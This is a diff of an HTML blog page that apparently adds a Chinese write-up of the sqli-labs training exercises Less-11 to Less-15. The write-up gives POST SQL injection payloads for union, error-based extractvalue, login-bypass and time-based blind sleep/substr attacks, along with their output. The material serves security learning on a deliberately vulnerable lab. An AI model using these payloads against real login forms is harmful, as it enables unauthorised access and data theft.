+<p>发送到repeater中尝试post注入，试试<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>=admin <span class="keyword">and</span> <span class="attribute">1</span>=2 union select &amp;<span class="attribute">passwd</span>=admin&amp;submit=Submit</span><br><span class="line">1,2</span><br></pre></td></tr></table></figure></p>
+<p>发现回显，也就是说存在union联合查询注入，但是还存在报错注入。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin 'and extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="name">select</span> database()))) --+&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure></p>
+<p>extractvalue函数需要一个xpath路径，而concat组合出来的database并不是xpath形式，所以会报错，但是这种报错注入的方式仅仅能用在显错注入上<br>报错注入的结果是</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">XPATH</span> syntax <span class="literal">error</span>: <span class="string">'~security'</span></span><br></pre></td></tr></table></figure>
+<p>当然最简单的方式是直接sqlmap跑……</p>
+<h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h1><p>输入admin’ or 1=1#发现没有回显，那我们试试双引号，发现直接报错，是需要双引号+括号的形式:”)</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username：admin<span class="string">") or 1=1#</span></span><br><span class="line">password:admin</span><br></pre></td></tr></table></figure>
+<p>发现直接登陆上了管理员的账户，存在post注入，我们试一试报错注入<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username：admin") and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>())))#</span><br><span class="line"><span class="keyword">password</span>:<span class="keyword">admin</span></span><br></pre></td></tr></table></figure></p>
+<p>结果是</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">XPATH</span> syntax <span class="literal">error</span>: <span class="string">'~security'</span></span><br></pre></td></tr></table></figure>
+<p>一切OK</p>
+<h1 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h1><p>基于’)的注入，报错注入一行完事</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>=admin') <span class="keyword">and</span> extractvalue(1,concat(0x7e,(select database())))#&amp;<span class="attribute">passwd</span>=456&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>当然此题也能时间盲注，但是有其他注入方法的情况下极度不推荐时间盲注，因为实在是，太慢了</p>
+<h1 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h1><p>注释符不可用，所以随意闭合一下就好，基于”的盲注</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>=admin" <span class="keyword">and</span> extractvalue(1,concat(0x7e,(select database()))) <span class="keyword">and</span> <span class="string">"1"</span>=<span class="string">"1  &amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p>得出结果。</p>
+<h1 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h1><p>实在不想一点点去FUZZ了，我就使用了偷看sql语句大法</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$sql="<span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=<span class="string">'$uname'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'$passwd'</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">";</span></span><br></pre></td></tr></table></figure>
+<p>嗯 盲注，单引号<br>上一波时盲payload</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>=admin' <span class="keyword">and</span> sleep(5)--+&amp;<span class="attribute">passwd</span>=456&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>嗯，延时了，能时盲，<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin' and if(substr(database(),<span class="number">1</span>,<span class="number">1</span>)='s',sleep(<span class="number">5</span>),<span class="number">1</span>)--+&amp;passwd=<span class="number">456</span>&amp;submit=Submit</span><br></pre></td></tr></table></figure></p>
+<p>嗯，延时了，能推断出第一个字母是s，解决问题。</p>
 
       
     </div>
@@ -321,7 +416,7 @@
         <p><span>本文标题:</span><a  href="/2019/11/02/Sqli/">Sqli-lab 1-65关放弃指北</a></p>
         <p><span>文章作者:</span><a  href="/" title="访问 Crustsalt 的个人博客">Crustsalt</a></p>
         <p><span>发布时间:</span>2019年11月02日 - 23时30分</p>
-        <p><span>最后更新:</span>2019年11月02日 - 23时31分</p>
+        <p><span>最后更新:</span>2019年11月07日 - 11时52分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2019/11/02/Sqli/" title="Sqli-lab 1-65关放弃指北">/2019/11/02/Sqli/</a>
             <span class="copy-path" data-clipboard-text="原文: /2019/11/02/Sqli/　　作者: Crustsalt" title=""></span>
@@ -334,6 +429,15 @@
 
 
 <nav id="article-nav">
+  
+    <a  href="/2019/11/07/文件上传靶场/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          文件上传靶场
+        
+      </div>
+    </a>
   
   
     <a  href="/2019/11/01/套接字编程学习/" id="article-nav-older" class="article-nav-link-wrap">
@@ -349,7 +453,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Sqli-lab-1-65关放弃指北"><span class="toc-number">1.</span> <span class="toc-text">Sqli-lab 1-65关放弃指北</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Sqli-lab-1-65关放弃指北"><span class="toc-number">1.</span> <span class="toc-text">Sqli-lab 1-65关放弃指北</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-1"><span class="toc-number"></span> <span class="toc-text">Less-1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-2"><span class="toc-number"></span> <span class="toc-text">Less-2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-3"><span class="toc-number"></span> <span class="toc-text">Less-3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-4"><span class="toc-number"></span> <span class="toc-text">Less-4</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-5"><span class="toc-number"></span> <span class="toc-text">Less-5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-6"><span class="toc-number"></span> <span class="toc-text">Less-6</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-7"><span class="toc-number"></span> <span class="toc-text">Less-7</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-8"><span class="toc-number"></span> <span class="toc-text">Less-8</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-9"><span class="toc-number"></span> <span class="toc-text">Less-9</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-10"><span class="toc-number"></span> <span class="toc-text">Less-10</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-11"><span class="toc-number"></span> <span class="toc-text">Less-11</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-12"><span class="toc-number"></span> <span class="toc-text">Less-12</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-13"><span class="toc-number"></span> <span class="toc-text">Less-13</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-14"><span class="toc-number"></span> <span class="toc-text">Less-14</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-15"><span class="toc-number"></span> <span class="toc-text">Less-15</span></a>
 </div>
 <style>
     .left-col .switch-btn {
@@ -410,7 +514,9 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a  href="/" title="回到主页"><i class="fa fa-home"></i></a>
+            <a  href="/2019/11/07/文件上传靶场/" title="上一篇: 文件上传靶场">
+                <i class="fa fa-angle-left"></i>
+            </a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
@@ -419,7 +525,7 @@
             </a>
         
     </div>
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/11/02/Sqli/">Sqli-lab 1-65关放弃指北</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/01/套接字编程学习/">套接字编程学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/31/PhpStudy_RCE漏洞复现/">PhpStudy RCE漏洞复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/30/Windows API编程/">Windows API编程</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/28/Java-容器学习/">Java-容器学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/23/非递减数列/">非递减数列</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/14/sqlsever反弹注入/">SQLSever的反弹注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/14/两数之和/">两数之和</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/14/整数反转/">整数反转</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/11/07/文件上传靶场/">文件上传靶场</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/02/Sqli/">Sqli-lab 1-65关放弃指北</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/01/套接字编程学习/">套接字编程学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/31/PhpStudy_RCE漏洞复现/">PhpStudy RCE漏洞复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/30/Windows API编程/">Windows API编程</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/28/Java-容器学习/">Java-容器学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/23/非递减数列/">非递减数列</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/14/sqlsever反弹注入/">SQLSever的反弹注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/14/整数反转/">整数反转</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/14/两数之和/">两数之和</a></li></ul>
     
 <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
 
